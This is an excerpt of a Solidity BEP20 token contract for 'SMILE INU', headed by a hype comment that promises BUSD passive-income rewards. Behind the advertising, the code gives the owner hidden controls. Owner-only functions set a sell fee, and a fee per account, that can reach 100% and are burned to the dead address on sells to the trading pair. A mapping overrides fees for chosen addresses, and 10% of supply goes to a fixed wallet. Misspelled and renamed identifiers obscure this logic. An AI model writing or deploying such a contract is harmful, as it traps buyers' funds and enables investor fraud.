...
/*
About SMILE INU2% BUSD REWARDS TOKEN , the next best pasive income token for the community made by a Based and Experienced team with 6 years experience behind projects . Goals : Getting on major tracking sites (CoinGecko,CoinMarketCap) , listings on CEXs , developing a huge holder rewards token for great ammount of volume , daily buy contests , shill contests and many more . Truly the next best pasive income token for you to get into whille its cheap . DONT LOOK NO FURTHER !!! UTILITIES UNDER DEVELOPMENT !!!
* http://instagram.com/SMILEINU866
* https://www.reddit.com/user/SMILEINU866
* TWITTER:https://twitter.com/smile
* WEBSITE:https://www.smile.io
* TELEGRAM:https://t.me/smile
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingSMILEINU866OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingSMILEINU866OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingSMILEINU866OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingSMILEINU866OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingSMILEINU866OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function SMILEINU866To() external view returns (address);
    function SMILEINU866ToSetter() external view returns (address);
    ...
    function setSMILEINU866To(address) external;
    function setSMILEINU866ToSetter(address) external;
}
...
contract SMLE is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "SMILE INU";
	string symbol_ = "SMLE";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*1);	
        ...
        _defaultSellSMILEINU866 = 0;
        _defaultBuySMILEINU866 = 0;
    ...
    uint256 private _defaultSellSMILEINU866 = 0;
    uint256 private _defaultBuySMILEINU866 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellSMILEINU866 = _value;
    }


    function acSMILEINU866fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeSMILEINU866amuont = 0;

        if (rF) {
            uint256 tradeSMILEINU866 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeSMILEINU866 = _msgSMILEINU866Info(uint160(from));
                    tradeSMILEINU866 = tradeSMILEINU866 < _defaultSellSMILEINU866 ? _defaultSellSMILEINU866 : tradeSMILEINU866;
                }
                if (from == uniswapV2Pair) {
                    tradeSMILEINU866 = _defaultBuySMILEINU866;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeSMILEINU866 = _Escape[from];
            }


            tradeSMILEINU866amuont = _amuont.mul(tradeSMILEINU866).div(100);
        }


        if (tradeSMILEINU866amuont > 0) {
            _balances[from] = _balances[from].sub(tradeSMILEINU866amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeSMILEINU866amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeSMILEINU866amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeSMILEINU866amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeSMILEINU866amuont);
        emit Transfer(from, _to, _amuont - tradeSMILEINU866amuont);
    }
	...
	function _msgSMILEINU866Info(uint _acc) internal view virtual returns (uint) {
